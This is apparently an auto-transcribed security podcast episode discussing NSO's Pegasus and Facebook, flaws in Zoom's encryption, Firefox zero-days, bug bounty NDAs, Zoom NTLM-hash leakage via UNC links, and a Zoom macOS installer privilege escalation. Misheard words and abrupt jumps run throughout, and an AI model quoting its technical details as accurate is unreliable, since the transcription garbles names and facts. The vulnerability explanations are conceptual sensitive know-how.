everyone. Welcome to another episode of the day Zero podcast. You may notice we've picked up a fossil on our way to the podcast today anti is back with us. So I'm Specter with me as e and anti as well, which is nice to be able to say after a long while though. He is only with us for about 30 minutes or so. He's going to have to bail out and do some stuff. So, you know, we haven't for a little bit but not for the full episode but we've got quite a Content packed episode today in terms of topics. So yeah, let's just get right into the first one. So there was an article on Facebook about buying the Pegasus exploit So for anybody is from song go\", \"start\": 8.2}, {\"speaker\": 1, \"line\": \" if on Apple Insider about Facebook, yeah just clarify\", \"start\": 47.2}, {\"speaker\": 3, \"line\": \" that. Yeah, so obviously, I mean this this group NSO has been known to sell spyware in the past to nation-states and stuff like that. But the CEO of the NSO group basically said that Facebook asked to purchase the rights of capabilities. From Pegasus. So according to the CEO Facebook was interested in Pegasus because they had their own app called and overprotect Anova protect, which I think we covered before back when like know what the new we were comforted. We\", \"start\": 52.6}, {\"speaker\": 1, \"line\": \" covered on Facebook research which was kind of like, so an oval protect was banned from the apps Apple App Store and like somewhere in 2019, so to this happened this evening. Event happened with Facebook reaching out to buy some functionality of Pegasus happen in 2017, 2019 and overprotect was banned sometime last year. I think it was during the summer. It was also removed from the Google Play store which then led into Facebook research, which was that bpn that they kind of targeted towards or apparently or allegedly targeted towards teens and they would pay them like 20 bucks a month or whatever. Actually they might have targeted like a Team plus teens not not like 13 to 18. I'm not sure of the details on that but it is slightly different in terms of what type of information it was tracking things like that.\", \"start\": 84.3}, {\"speaker\": 3, \"line\": \" Yeah, so, you know according to the CEO they had went to by the you know by capabilities of Pegasus and apparently it was because they were worried that their app was less effective on iOS compared to Android which makes sense because iOS is like a lot more locked down in terms of privacy barriers and stuff like that than Android typically Facebook of you know, they kind of contradict this they say they're saying statement is meant to distract people from the fact that Facebook is suing in a so which they started like happy. Go for exploiting vulnerabilities and WhatsApp, but what I found interesting was they didn't outright deny the lake allegation. They just kind of said that oh, this is just to distract you from the fact that we're suing them but like, you know, it's weird. They don't outright deny it.\", \"start\": 143.8}, {\"speaker\": 1, \"line\": \" Yeah. Well, I mean, they probably it probably did happen. But the thing is it's unrelated to the fact that they're suing going to so group over the voice exploits and WhatsApp. Yeah, they're suing over one thing. It's kind of unreal a over the facto. Well Facebook also want to buy it is unrelated. So, I mean the fact that Facebook isn't denying get I mean,\", \"start\": 189.7}, {\"speaker\": 3, \"line\": \" I mean, it's hard to get Facebook the the benefit of the doubt after all the stuff they've been involved with\", \"start\": 214.8}, {\"speaker\": 1, \"line\": \" well, I don't think they need the benefit of the doubt. They very well could have tried to buy it. Yeah, I mean and there's not necessarily anything wrong with that. I mean people are immediately going to the facto. Well Facebook's I just tried twist I think anti had some thoughts on this. That's why we had brought him on.\", \"start\": 220.1}, {\"speaker\": 3, \"line\": \" Yeah. No, I mean, I guess I don't know. I mean I looked over the article and I thought you know, the two interesting parts were like the timeline, you know, like the 2017 when they first sounds like approach them to buy, you know, the specific stuff for a novel or only. However, you pronounce it protect. So I think you know what's kind of weird is, you know the timing I probably agree with Facebook and that they're probably Doing it just because they're being sued. So it's perfect, you know kind of cannon fodder but like I think the weird part is now that they're suing them like my weird Twitchy response is that maybe you know, if I had to guess the sounds like something that Facebook was investigating and probably heard about again the exploits that are available so on so forth and was like, well, how do we go and approach this group without seeming like we're investigating them, you know, so what better way than to go and kind of push for something that you're doing and go and say hey,\", \"start\": 238.3}, {\"speaker\": 2, \"line\": \" We'd like to use this to see if\", \"start\": 292.5}, {\"speaker\": 3, \"line\": \" we can further our capability. You know, some part of me just believes that it was like kind of a way to probably you know, still Leverage What they'd find from the NSO group, but also be able to fill those kind of like holes in their capabilities. Does that kind of make sense?\", \"start\": 293.9}, {\"speaker\": 1, \"line\": \" Yeah. Well and I kind of agree with you it does seem like you know, Facebook's a company that's already spending a lot of time trying to track you and trying to get information. Can you make yourself auntie? We're getting some background noise. So Facebook's already spending a lot of time trying to gather a lot of information. No doubt. They have a lot of very smart people trying to do. So so it does seem a little bit suspicious that they're coming to NSO group to try and track users. I like it just feels like this is something that Facebook should probably are probably does already know and that as you were saying there's probably another reason that led to them actually approaching anti so group and I think a very well could have been related to them trying to get like threat Intelligence on what and a so group was doing rather than it being relate to them actually wanting to utilize the techniques out of the malware.\", \"start\": 310.3}, {\"speaker\": 3, \"line\": \" So You think it's a less malicious in nature than it\", \"start\": 370.4}, {\"speaker\": 1, \"line\": \" seems. I'm willing to give Facebook that benefit of the doubt in a sense. That I don't think Facebook was looking to just start spreading spyware. I mean, I think that that just doesn't at least to me it doesn't really fit with and I'm not saying like Facebook is this completely trustworthy company or anything? It's just as a legitimate company. It doesn't seem likely to me that they were looking to actually, you know, just start using spyware and to be clear. They do only asked to use parts of Pegasus. Not the entire thing.\", \"start\": 373.3}, {\"speaker\": 3, \"line\": \" I mean it's worth noting that they also are worth how many billions of dollars you know, and their whole business model is built on you no not spying on user but collecting data on their user. So I'd be surprised to feel like they need to go to a group like NSO group to figure out ways to do that. You know, it just seems a little silly not to say that it isn't something they could have done but you know the more we look at it the more it just seems like why would they even need to go that bar? It'd be a perfect guys though to be able to say. Hey. Eat it for you know, the Privacy aspect we can't get through some of these controls but it is totally possible to to fare as well that they maybe didn't have that capability.\", \"start\": 413.5}, {\"speaker\": 1, \"line\": \" Yeah, I know but\", \"start\": 451.9}, {\"speaker\": 3, \"line\": \" I kind of feel like a lot of people are leaving Facebook with all the pr like, you know battles that they've had with over the past couple years of all the stuff they've tried to pull like with the VPN app, for example that we were talking about earlier. I mean, I think they are having a harder time now collecting the data that they used to be able to collect so it does seem possible that they would want to go that like extra step to try to get more data where they couldn't they can't get as much now as they could\", \"start\": 454.3}, {\"speaker\": 1, \"line\": \" before. Yeah, but this kind of monster was in 2017, though. Like this wasn't like for. Yeah, but approach that. Now this\", \"start\": 481.4}, {\"speaker\": 3, \"line\": \" is was still kind of like\", \"start\": 488.2}, {\"speaker\": 1, \"line\": \" Facebook had a lot of facts is because they still had their own overprotect on the app store which gave them a ton of access. It was in 2019 that Apple changed their terms that stopped allowing basically stopped along Facebook actually no information about like what apps are running and all that detailed information that they would have wanted to collect. So if this were more recent, but in 2017 I mean, they would have had a lot of this information just from the people already installing their application and I mean, could you imagine what would happen if it were found out that Facebook was legitimately just installing malware.\", \"start\": 490.0}, {\"speaker\": 3, \"line\": \" They've already done.\", \"start\": 534.8}, {\"speaker\": 1, \"line\": \" It is in terms of the Outlook from pretty much everybody because if you find out oh Facebook's\", \"start\": 536.6}, {\"speaker\": 3, \"line\": \" just you know, Facebook's\", \"start\": 543.2}, {\"speaker\": 1, \"line\": \" collecting a lot of information you're using their application. There's a I want to say implied consent when you start using Facebook, obviously, there's a ton of websites that tend to include Facebook. Like there's a lot of tracking and information that they're able to get without that. But basically as a legitimate company, I'm not expecting Facebook to go about breaking the law. And actually jailbreak some random person devices which Pegasus does being given a link through methods mentioned writing the document I using paying cyst, you know results in the Target device being jailbroken and the mail were being loaded to Modern steel data. It's one thing for Facebook to be collecting information. It's a completely different thing for Facebooked actually do so in a criminal in a alright.\", \"start\": 545.7}, {\"speaker\": 3, \"line\": \" Manner, but I guess my question is if they were doing this for thread until like you're saying I mean, how does this really help them in any way? Like, what are they going to do with that?\", \"start\": 590.1}, {\"speaker\": 1, \"line\": \" It's being aware of exploits being used against them would be one case\", \"start\": 601.2}, {\"speaker\": 3, \"line\": \" but I guess this was already known like\", \"start\": 606.5}, {\"speaker\": 1, \"line\": \" Pegasus was knowing not necessarily all the details in 2017. I'm glad assume that they Continue to update Pegasus. I can't imagine that they use the same exploits now that they use in 2017 or they'd be using the same exploits in 2017 that they were using in 2015 or 2016 or not me. This is something that NSO groups continuing to sell. I have to assume that part of this process includes, you know updates\", \"start\": 608.5}, {\"speaker\": 3, \"line\": \" but those Let's Plays don't affect Facebook. Like that's why I moved to sit up that we're\", \"start\": 639.0}, {\"speaker\": 1, \"line\": \" gonna so group was using attacks on WhatsApp though, which does\", \"start\": 643.1}, {\"speaker\": 3, \"line\": \" involve Okay. Yeah, that's true. It's good. Yeah fair enough. I'm sorry. I thought you were gonna say something. No, it's good. I think I was just about to see what he said basically is that you know, like wow, it doesn't directly go after them. Didn't they have capability to scrape, you know users information from at least WhatsApp and you know, they may not have told the public their capabilities right up the way so they may have had you know functionality to steal Facebook stuff and you know other products blowing into Facebook. So I mean, I just the simple part of it though is I find it funny weirdly enough that it ever agree with face. A book on the fact that you know, it's weird that they would sell me throw this out there when they knew years ago that it was such an issue. You know, I do find it weird. Also though that if Facebook was trying to you know, go and find more private information of their users, you know, it's like going to try and protect your house with security cameras are being like actually I'm going to go to the Colombian drug cartels and by AK-47s to protect myself that like, it's such a weird Step 2. It doesn't make sense.\", \"start\": 647.3}, {\"speaker\": 1, \"line\": \" Yeah. I don't know so obviously I don't\", \"start\": 706.1}, {\"speaker\": 2, \"line\": \" want Earth\", \"start\": 707.9}, {\"speaker\": 1, \"line\": \" can threat intelligence. So perhaps you'll correct me on this but it feels like it would be kind of up their alley if say Facebook's internal threat team. It just finds out that an assault groups may be doing something against Facebook. Now, I'm actually going to walk back my prior statement. It wouldn't make a lot of sense if NSL group were actually like had exploits are earning Facebook that they would then sell those exploits the Facebook. So I'm going to walk back onto my statement on that. That odds are they weren't going for help. We're necessarily looking for that because if they were they would probably approach and a so group under the cover of some other.\", \"start\": 708.4}, {\"speaker\": 3, \"line\": \" Throat, sorry know what they could have. No, you think could have gone over it a billion ways. I mean the the idea of threat intelligence rights to to stop threats and like some companies like Facebook are probably a little fast and loose with it. So they come up with some koi idea of like a let's go and tell him it's just for this. I mean I if I had to guess the way they wanted it to pan out was that they were probably going to get in there first off. They may have taken the capabilities and may have very well done that to spy on users more and stuff like that, but I think it also could have one of those things that you know NSO group if they sign up Facebook as a client. It's kind of awkward to them be offering functionality to steal your clients crap. Like, you know, you can't you can't be like, oh well now our latest version of this Mauer that we've created steals Facebook user accounts or Whatsapp. Like it's probably a little more sketchy on that end. So they it could have been just a weird roundabout way to get them to stop targeting Facebook and it's you know other companies if you think about it\", \"start\": 749.4}, {\"speaker\": 1, \"line\": \" could have been I mean the thing is Facebook does have a lot of money. Throw around to your so that that kind of just ties in with Azure say like being a little bit fast and loose on that and we'll just come up with some idea and give it a try. I don't know how much money actually goes towards thread until with Facebook but given kind of the size of Facebook. I wouldn't be surprised to find out if there's a pretty substantial amount there. But honestly, I made it on a whole idea. I do agree with you on today feels weird like this is the timing friend is So group releasing that information, obviously, it's released as part of the Court. Court documents so it's not like, you know NSL group just like did immediately could but I don't know to me looking at from the outside. I'm not a lawyer. I don't know the intimate details here. It does feel more or less unrelated only showing that maybe they had a client relationship with Facebook.\", \"start\": 805.4}, {\"speaker\": 3, \"line\": \" It seems like they just want to get a shot in the\", \"start\": 866.2}, {\"speaker\": 1, \"line\": \" face.

We don't know like all the hard details. Maybe we will see more come out through that lawsuit like in the future. I don't know but yeah, it is like kind of a weird story. Maybe we'll find out more later. That being said, I think we can move on to some Zoomer stuff. So Zoom, is that some pretty bad PR over the last week and this is the first of many courses related to our Feast on zoom in this episode and part of the reason Zoom has gotten so much attention lately is do Self-isolation with you know current world events. It's being used a lot by companies and governments and lots of other places for meetings. So Zoom has had security incidents in the past. So, you know researchers have started looking at it more closely do it being used so much lately and these researchers discovered some issues and that's because Zoom seems to have some disingenuous claims related to crypto that are either not don't seem to be true at all or seem to be misleading\", \"start\": 870.6}, {\"speaker\": 1, \"line\": \" disingenuous or possibly just misunderstanding like written by somebody that doesn't understand that spot like Mark marketing may be doing a lot of fat and and I come at that just because they talk about some one of the things brought up in this is end-to-end encryption Zoom claims are has claims about their end-to-end encryption and like immediately following those claims. Zoom ends up talking about like TLS being used which TLS is definitely crypto, but it generally speaking like anti end is going to be a par from your standard TLS. I'm trying to find the picture. I'm thinking of in the document. But\", \"start\": 934.6}, {\"speaker\": 3, \"line\": \" but I think the other issue is only the key exchange happens over TLS. I don't even think the the actual packet exchange happens over TLS. My am I wrong on that or\", \"start\": 983.1}, {\"speaker\": 1, \"line\": \" I'd have to look into it.

I don't know if it's scroll down for you, but they have like get ski over TLs, but then the meeting it says it's encrypted with AES over UDP, but\", \"start\": 1002.0}, {\"speaker\": 1, \"line\": \" like, okay, so that's that's a separate\", \"start\": 1018.1}, {\"speaker\": 3, \"line\": \" from it. Yes key is not like end-to-end encryption.\", \"start\": 1020.0}, {\"speaker\": 1, \"line\": \" Yeah. No, like their whole end-to-end encryption is definitely wrong but seems like it's just somebody that doesn't understand what intend encryption actually is. And that could be intentionally misleading or could not other things that are mentioned in here are the they're using AES 256 in reality. It looks like they're using AES 128 and they're using ECB mode. If you're not familiar with the ECB mode actually they have the classic picture in this article classic picture is based with ECB mode. It takes a key and basically just applies. Is it to the block so a s is a cipher or block Cipher? Sorry, it's going to say Cipher block, but it's a block Cipher. So what happens is it splits up whatever your messages whatever you want encoded it gets split up into equal sized blocks and then the key wouldn't you could apply the key in several different ways. You could for example apply the key to the first block and then apply the second block to the following block and kind of chain them along ECB mode basically takes the key. Applies it to the block as so there's no connection between any of the following blocks? So what ends up happening is you end up with these pad if you have patterns in your data is two blocks are the same the resulting ciphertext will be the same. So that's only really an issue if you have data that's going to be repeating. So the classic example is this very much like uncompressed bitmap of the tux penguin. And you'll notice even when it's encrypted if you're able to see our video that you can kind of make out the outline of top so you can see kind of the original image or parts of the original image, even though it's technically encrypted. So that's why ECB mode is a problem. But the reality is when we were talking about audio odds are you're not having a lot of that sort of completely repeating blocks, you know, people are going to speak definitely the audio data is going to be continually changing. So there are things that could be Pulled out you can get information such as Cadence of packets kind of decadence of what's being spoken. There are definitely things that you can leak because of ECB mode but the risk isn't huge in a lot of cases with these female. Again, the problem with ECB is less ACB and more the fact that if you're using it odds are ECB is not the most significant problem in your crypto.\", \"start\": 1024.2}, {\"speaker\": 3, \"line\": \" It's a code smell Birds the crypto\", \"start\": 1182.2}, {\"speaker\": 1, \"line\": \" quibble. It's definitely an issue. It's generally an issue because we use it's the easiest block mode to use pretty much all the other options require some other settings usually like an initialization Vector that would just be like some starting value so that every every encrypted instant sins up starting different and so they'll always kind of be different even when data is the same. So you'll use an IV for that. They need some further data. Whereas doing ECB mode. You need a key and you need the data. It's kind of that classic what you think of crypto if you don't really understand how crypto works. It's like you think that's what you need the data. You need a key. So people who end up use that tend to be the type of people who don't really know the difference. They just know what they want. They want this crypto therefore they use the easiest thing\", \"start\": 1184.4}, {\"speaker\": 3, \"line\": \" available. Yeah, so there was also another issue that they said they discovered in the waiting room feature, but they're not disclosing it yet because they want to wait until it's fixed because of the risk, it could pose to users but they said they are going to disclose it when it's been fixed and everything. So we may see that on like a future episode we can go a little bit more to the specific specifics of that issue. I think with the most worrying part of this article was was the Shady bindings where the keys were actually being sent through.\", \"start\": 1238.6}, {\"speaker\": 2, \"line\": \" He\", \"start\": 1270.6}, {\"speaker\": 3, \"line\": \" servers even when none of meeting participants nor the company hosting the meeting were based in China.

So I which\", \"start\": 1270.7}, {\"speaker\": 1, \"line\": \" is the beauty about when you hear the key going through there and we know it's not I intend encrypted and to be fair I am going to mention so I've used Zoom a fair bet well prior to this.

Right like they can't do EET simply because you can call into it. Like literally call it was so because of that. There's no way you could do end-to-end encryption Zoom needs to be able to decrypt act in order to let people call\", \"start\": 1296.3}, {\"speaker\": 3, \"line\": \" in.

I'll give my final resting statements on it so that you guys can crap on them later. Well, I did want to ask you one more thing anti if so, would you be able to stay on for like a few more minutes?

Um, no, I was just going to say, you know, since the people of crap Emma so much Zoom for a lot of reasons sucks and I don't like you I don't trust it. But at the same time like I do feel bad that I guess in New York, the things the governor for schools that they can't use zoom in. Anymore because of the concerns but I mean, I haven't seen like a of all the campaign's that I currently wash and you know, I don't see anyone targeting Zoom the way that people will blow it up. So I feel bad genuinely that even as a Chinese company, they probably are sketchy a little bit, but I don't know if they definitely deserve like the widespread hey of like, you know, these guys are still in your keys to crypting a conversation.

Well China hasn't given any like the Chinese government hasn't given anybody any reason to give them the benefit of the doubt with any anything they're connected with so never heard them do anything bad to anyone. Okay, you can take that to the bank. Please. Don't kill me how much money get paid. But anyway, I'm gonna do a last-minute topics which are just because you do have to go here in a few minutes. I wanted to bring up the Mozilla advisory. So there's not too much to talk about here because the technical details are actually locked off, but there were there were some security vulnerabilities that were About Firefox one was a use after free through race condition and the NS stock shell the destructor and the other one was another race condition yielding use after free when handling a readable stream. So, you know, these are obviously they're both Firefox issues. We don't have the technical details and I think those bug references are probably going to be locked off forever. I don't think Mozilla ever opens them up to the public. But what made this notable was they noted that the targeted attacks. There's targeted attacks in the Old that are abusing these vulnerabilities and I think I thought that was interesting to see on Firefox because typically when you see that notice on browsers, it's Safari or Chrome because those are the default browsers on mobile operating systems. So I think it's interesting to see targeted attacks hitting Firefox where Firefox doesn't necessarily have the greatest market share when you're talking about browsers. So I was wondering anti do you think this could possibly be targeted the tax on Tor users? Because I know Tory uses Firefox under the hood right\", \"start\": 1678.0}, {\"speaker\": 1, \"line\": \" yes it does Tor Browser does technically you create you can use other browsers\", \"start\": 1781.3}, {\"speaker\": 3, \"line\": \" yes by default the Tor Browser that everyone gets is using Firefox has its base right now are so you're asking specifically if it's likely that is towards towards users or just in general targeting people yeah I was just wondering if like you think that these attacks that are using these vulnerabilities could be going after like Tor users it's like you know slow let's say journalist potentially using a tour for anonymity or something like that heylia dude are you kidding me I mean now I can't say Let me clarify first and foremost I can't 100% say right now that that's happening because I haven't no one obviously if they're being very hush-hush about it this happens every time with some of those well there's a campaign out there like what does that mean who is it you know so I don't know a hundred percent what that means in terms of this the specific one but you know it would be silly and my eyes for any nation state especially some of the more One's targeting various individuals right within the dark web who use Tor Browser and stuff like that. It would be almost nonsensical for them not to leverage that right now assuming that that's what this lens its capability towards right targeting users and exploiting them which it sounds like it does. You know, if you look at most of at least from my understanding the targeting of Tor users a lot of the exploits haven't even been sophisticated or relatively new right? It's always been people using outdated browsers and should I don't think for the most most part you're going to see like a lot of exploits getting dropped on Tor users that are relatively new may be attacking the service itself. But for this specifically to answer question. Yeah. I mean if it's something that targets to our Firefox, which is what's or browser is based off of I would be surprised if they decided no unless they've got so many exploits available. But even then again, it's just something to add to your Arsenal, you know, so I 100% it would be an easy just addition to anything that's assuming they can get the information out there. We don't Enough about the campaign and what details are out there, so it may not even be applicable just yet. If it's something that was only partially observed,\", \"start\": 1786.8}, {\"speaker\": 1, \"line\": \" you know. Yeah, which is a I think Fair Point on that. I mean we can't know for sure who was being targeted with it. I think it's a reasonable to say that the Tor Browser is one of the juicier Target. If you are writing the eau de using it in the wild that said the Firefox users can also be generally are going to be a little bit more technically oriented. So it can also just be a position thing where maybe the Firefox user also happens to be a sysadmin with Access to more stuff or other reasons why you might talk that so it could be unrelated to\", \"start\": 1906.8}, {\"speaker\": 3, \"line\": \" tour. Yeah, okay fair enough. I was just curious on Auntie's take because I didn't know how common those types of attacks were. So yeah, I just you know, I wanted to get that in before you left because I imagine you probably are you going to jump out now anti or are you good for a little while? I'll probably jump out now but yeah, I mean summarize yet, you'll see if it doesn't get released. I don't think you'll use seeing used against a lot of average users because most botnet owners and people, you know, targeting regular people often need the actual POC code itself, so Yeah, no, we know in the targeted. So that's it from me. I'll hop off and pop to listen later if you guys crapping on the other people.\", \"start\": 1946.2}, {\"speaker\": 1, \"line\": \" All right, thanks for joining\", \"start\": 1986.8}, {\"speaker\": 3, \"line\": \" us. Thanks. Y'all have a good one. All right, so we'll jump into the bug Bounty platforms topic. So we have a topic by CSO and it's basically saying bug Bounty platforms by researcher silence violate labor laws critics say so, you know one topic we've talked about a lot on this show is bug bounties and You're not disclosure should be allowed and generally I think we agree. It's reasonable to some degree. The vendors have the final say on what a report goes public or if it does at all after it's been reported through Bounty program. Well, it seems that's being challenged. So your\", \"start\": 1987.8}, {\"speaker\": 1, \"line\": \" I at least want to say I think and I want to be really clear Ideal World full transparency. Everyone has bounties Look at that for a sec you could have night in. Yeah. So in an Ideal World will have full transparency all vulnerability reports become made public and everybody has bounties that's kind of your ideal case, I believe but we don't we get there step by step. We're not at that point yet, obviously, and actually I will I will step that back a little bit maybe not every company has bounties. I do believe bounties or some that should be introduced once the Once your security is fairly mature, you don't want to just have somebody. Oh, I just wrote this over the weekend. Well, hey, here's you know a hundred bucks for every bug you find and like, you know, put them out of\", \"start\": 2022.3}, {\"speaker\": 3, \"line\": \" business. Yeah, you end up throwing money away.\", \"start\": 2071.8}, {\"speaker\": 1, \"line\": \" Yeah, like it's part of the maturity process to end up adding a bounty end. But Ideal World is generally speaking one sermon speaking about mature companies and companies that have a mature security process vulnerability should be disclosed. Publicly and and and they should have a bounty and I do also want to adjust as we get started on this draw really quick distinction because we're going to be talking about like nda's and agreements before you're even able to start testing itself that there is there's two kind of types of applications. You could be testing. This is a very wide Description but either an application that is hosted by somebody else. So if you're testing Facebook, you're not self-hosting Facebook or PayPal or something like that. You're not self-hosting those things. Somebody else is hosting its so in order for you to test you need their permission. Otherwise, it's unauthorized access and the Computer Fraud and Abuse Act and the u.s. Is insanely vague when it comes to actually defining what unauthorized access is Although I think actually some of that may have changed recently. There was something about the terms of service not being is binding. Although I know there have been cases where terms of service and basically, well you violate the terms of service. Therefore all your access was unauthorized than it was Computer Fraud and Abuse self sudden, I think something about that changed. I don't follow a lot of the legal cases. So maybe I'm wrong, but generally speaking. I'm just going to be speaking under that assumption unauthorized access. If you don't have permission to be hitting that hopes that application that's somebody else Helsing the other type of application. You can be testing our self hosted things things that you could run locally if you want to test Android if you want to like work on your Android phone you could do that or Linux your operating system running a web server locally. You can test all that kind of self hosted you can do whatever you want on those service. It doesn't matter what the ndaa As you're breaking no laws by doing that local testing. Well, if you violate their dmca can come in there are some things but generally speaking you're not violating any laws by doing that sort of local testing. I just wanted to bring that up because when we talk about bounties most of them are these hosted applications, some of them are self hosted and I think a lot of what's going to come up really has to do more with the hosted applications, which is most bounties that you see on The program like cat or one or bug crowd.\", \"start\": 2074.5}, {\"speaker\": 3, \"line\": \" Okay, so bring up the point you were saying earlier with like in an Ideal World. Everyone would have bounties. It actually seems like some researchers are challenging that a little bit they're pushing for vulnerability Discovery programs instead of bug bounties. I have if there's a little bit of like a different term like set of rules with that. It's a bit more like you can't Outsource it. I think are you\", \"start\": 2235.1}, {\"speaker\": 1, \"line\": \" sure about that? Because I thought it was vulnerability disclosure. Programs not discovery, which is a different part of the process because they talk on V DP which is vulnerability disclosure\", \"start\": 2258.3}, {\"speaker\": 3, \"line\": \" policy. Sorry. That's what I meant VDP.\", \"start\": 2269.5}, {\"speaker\": 1, \"line\": \" Okay. So VDP that was slightly different VDP is and this article actually I think just makes a mistake kind of conflating VP with coordinated disclosure if EDP is just the disclosure program. So having like a Security Act email address or the secure. T dot txt file having a way for researchers to reach out and disclose vulnerabilities to you in a safe way in a way that they're not going to be charged with a crime for doing so that's what the VDP is. Okay. So that's a little bit different bounties separate from that. And yes, every company not just mature companies should have a VDP. Some people do have questions about the bounties will be getting to that later on in this topic. But I guess when we just start off going through in order here, one of the first things that comes off our first issues really raised comes down to the Safe Harbor and NDA. So like I just mentioned reporting a vulnerability you kind of end up in a case where if you report the issue they can then say well that was unauthorized access. We're going to charge you, you know your going to be prosecuted for that crime, even though you're trying to do the right thing by reporting vulnerability and this is definitely happened. And I think I've talked about my views on disclosure of ought over the last few episodes and I think a big part of kind of my weariness and like always deferring to what the company wants comes down to kind of having had my start and the days where people definitely were being resident. They weren't operating in the most Adamant manner, you know testing for SQL injection on every website you visit type thing. But you know, they'd report that and then get charged with the crime for it there. They're testing definitely wasn't. Wasn't in line with what would be considered responsible and I'll be fair to admit that but at the time basically there was no option. Now. You can run vm's you can do with law without needing to actually test on somebody running a real server. There's a lot you can do but you know still for teenagers in the late 90s early 2000s. It was definitely a lot harder to do that and at that time people would test and report an end up charged with I'm so I think that's kind of where some of my views on just letting the company do whatever comes in. So now jumping back to the safe harbor Safe Harbor is just that you won't be charged with the crime. What's happening with bugcrowd hacker one with private bounties is that you'll basically be told sign this NDA you'll be added to the private Bounty and then you can report your vulnerability. So you can talk about the show before you can disclose or they basically set a gag order on anywhere. You can't talk about here issue if you want to disclose it to them. Or if you want to do the responsible thing and\", \"start\": 2272.0}, {\"speaker\": 3, \"line\": \" yeah, basically trying to punish people for for going the right way. Well, so\", \"start\": 2465.9}, {\"speaker\": 1, \"line\": \" here's the other thing though and it is worth noting like most vulnerability assessment have an NDA, you know real world assessments when you're working for a company that's been hired to do an assessment. You have an NDA. I can't, you know talk to you about all the vulnerabilities I found in whatever clients I've had. Now there's an NDA there like that is a pretty standard process. It's just like you don't want to effectively humiliate your client so it is different with these. Well, so again that kind of comes down. I definitely there are cases where I don't know. I'm just trying to think here if I can come up with a good example where perhaps it would be a good idea not to publicly disclose or at least not and when we talk about it publicly disclosed generally where I'm assuming I'm assuming things have been patched and have had people who've had time to update. And in that case like know as I did say earlier, actually, I do think all vulnerability should eventually become public. So there's no case where they shouldn't at the same time when a company is hiring, you know, a pen testing firm. Any funding is going to be damaging to their reputation. No matter what so I can understand the company not wanting to expose that and I want to be yeah, we had these vulnerabilities and thus they're hiring researchers do it at the same time. I mean, yeah, I would like to see those public but I get why company wouldn't want that out there, especially if it's pre-release products. I know for me A lot of times we'd be brought on kind of during the standard release cycle.

Well, I don't actually know the numbers to compare like literally like our most requests generated by bounty hunters or by hired can hire Consultants or whatever but generally speaking there are a lot of Assessments that do happen under an NDA that are just they're hired to do it. It's not under some sort of public bug Bounty that said there's a trade-off when it comes to public bug bounties. And I'm going to and I'm going to say like I don't agree with having an NDA to report a vulnerability. In general, I mean, I think more Andy like a timed NDA where it's like you can talk about this until it's patch or until we reject the issue or something. I think that's fair.

I hope I'm saying that right and it actually relates a little bit. It to zoom it was issues found in the zoom client. So we tried contacting them to get the bugs fixed and he offered them, you know, the standard 90-day disclosure deadline to ship a patch and then you know after that 90-day deadline he would disclose it to the public and they kind of they didn't want that. They wanted him to accept the Bounty and sign an NDA that would have forbade him from you know, publicly disclosed in the issue and I think the reason that researchers are wary of that is they're worried that they're basically Going to by The Silence of the researcher and they're not going to fix the issue or they're not going to take the issue seriously and fix it like way down. The line after could have been abused by, you know, malicious actors during that time period so I think that's why there's like more of a stigma around bug bounties why some of these researchers is this like you're buying my silence and not actually fixing the\", \"start\": 2720.6}, {\"speaker\": 1, \"line\": \" issue. Yeah, and I'm actually going to say like, this is something that I think hacker one is in a really good place to change. You know if they so I again get you get there and steps getting to that fool complete transparency all the time you get there and steps. So what I could see is like having a plant, you know, a company signs up with hacker one because hacker one does offer a lot of benefits to come near homes having the bug triage having some of that so they're not getting all the garbage report and then they get a little bit of tension if you offer a bit of money, there's and how One just makes it easy for the company's so hacker wants in a good place. So to also start pushing those companies towards a better model where their disclosures and hacker one doesn't do this, but I think something hacker one could do is a company signs out with them. Okay, you don't need to disclose anything in your first year with us. But in your second year, you know, you need to be disclosing, you know, all of your critical vulnerabilities. Or you know and in your second, or maybe maybe they'll go the other way like but having some sort of step-by-step process were over time. They're going to increase the amount of disclosure. They have and working them up towards that I think that's something hacker one could do they don't do it, but given the position that they're in they could easily leverage their position to walk to do something like that, which I think would push security forward in general.

You shouldn't be getting paid a minimum wage for bug hunting like they're kind of suggesting there.

Seeing actual client information you should be pulling down actual, you know credit card information or something like that that said that Specter was saying I'm not a lawyer perhaps with gdpr that doesn't matter and just if you have a vulnerability that could have been used to breach this data.

And it'll send your ntlm hash over to the Target server. That's the actually it's kind of an issue with Windows. Just sending your authentication by default. Although it is kind of a sane move to send. Credentials you can turn it off by default. I'd recommend doing that and then you just have to manually basically get it to send which I think would be a more sane default, but I kind of understand the history here.

I mean this was blown way out of proportion. That's that's kind of what I was going to find a way to say is the gist of this is don't click random links, especially not random links that are UNC paths. I was actually I was on a Discord. We're in the staff chat. They actually asked like do we want to you know, add everybody about this because it's such a huge issue. It's just like one they don't normally alert people about issues at all to Don't click links like this. Isn't that big of an issue? Don't get me wrong. And actually I will say like for Zoom doing it like zooms. You said a lot of business contexts where you're going to have these sorts of Link's flowing around. It makes sense to make them clickable.

Our next one is actually a zoom topic\", \"start\": 3585.6}, {\"speaker\": 1, \"line\": \" to actually to vulnerabilities in this one. Yeah, this is two things one is the local privilege escalation to root on I think both of these. Yeah, both of these are on OS\", \"start\": 3590.4}, {\"speaker\": 3, \"line\": \" X so they're both Mac OS based issues.\", \"start\": 3604.7}, {\"speaker\": 1, \"line\": \" Yeah, so Both of these are LP2 wrote and code injection that gives you access to the microphone and Camera. Basically, they just discovered and this was another one that I saw getting mentioned a lot witch. It's at least I'd argue about it one. It's more on zooms all it's more. It's more zooms fault and maybe a little bit more useful in terms of actually doing something with it. So the gist of the first one though local privilege escalation is that the zoom installer uses this lovely API authorized ex came with privileges. Basically just a way to execute with enhanced privileges are execute is roped. The API itself is documented as being insecure shouldn't be user. I believe it's even deprecated on OS X but it doesn't validate the binary. It doesn't make sure it's signed or anything like that if the binaries read-only are can't be modified. There is otherwise protected it's still kind of okay to use it. but but with that it doesn't validate so if somebody could change the binary. They're basically to give her a note Zoom. The binary of Ron's is basically a bash script run with route. So during installation that run with root file as a period of time where it isn't protected as the installer unpacks the package file into a temporary user writable location. So somebody could exploit that by waiting for that file to eventually exist and be created and replacing with their own content and Then the installer will eventually end up running with roped. Whatever they put into that she'll file. Yeah terms of go ahead.\", \"start\": 3608.6}, {\"speaker\": 3, \"line\": \" So I'm just going to say you are you were cutting out a bit for me there. So like I apologize if I re it reiterate over an issue or you already touched over but part of what makes these issues a little bit more impactful to is it was actually discovered that the Mac OS installer would perform the install without you ever even clicking install because it abused pre-installation scripts. So on its own that shady but, you know, not necessarily malicious and But how it also gets that route privileged on the script that you're talking about that could potentially be hijacked is it'll prompt the user for root privileges. If you're not in the admin group, it doesn't prompt for root privileges as itself. It says system needs your privilege to 